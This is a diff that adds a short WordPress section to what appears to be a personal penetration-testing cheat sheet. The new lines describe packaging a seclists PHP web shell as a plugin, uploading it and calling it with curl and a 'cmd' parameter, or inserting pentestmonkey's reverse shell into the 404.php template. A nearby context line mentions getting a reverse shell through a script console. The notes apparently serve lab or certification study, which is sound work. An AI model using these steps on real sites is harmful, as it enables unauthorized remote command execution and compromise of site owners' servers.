@@ -163,7 +163,17 @@ one can easily get a reverse shell using this
 https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
 in /script
 
-
+=========
+Wordpress
+=========
+Use wpscan (shown in following) to scan website
+Once got access get rev shell
+	1) Upload Plugin.zip
+		cd /usr/share/seclists/Web-Shells/WordPress
+		sudo zip plugin-shell.zip plugin-shell.php
+		curl http://wordpress-site/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
+		
+	2) Edit template editor -> 404.php and add pentestmonkey's reverse shell
 ===============
 base 64 stuffs
 ===============
